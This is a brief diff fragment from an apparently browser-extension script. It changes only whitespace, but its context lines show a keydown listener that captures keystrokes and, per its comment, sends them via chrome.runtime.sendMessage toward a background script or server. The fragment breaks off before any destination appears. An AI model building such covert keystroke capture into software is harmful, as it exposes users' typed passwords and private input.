@@ -41,7 +41,7 @@ function getCurrentTabUrl(callback) {
 document.addEventListener('keydown', (event) => {
   // Capture the keystroke and send it to the background script or server
   // console.log(event.key);  // Example of logging keystroke
- 
+  
   chrome.runtime.sendMessage({
     type: 'log_activity',
     action: 'form_submission',
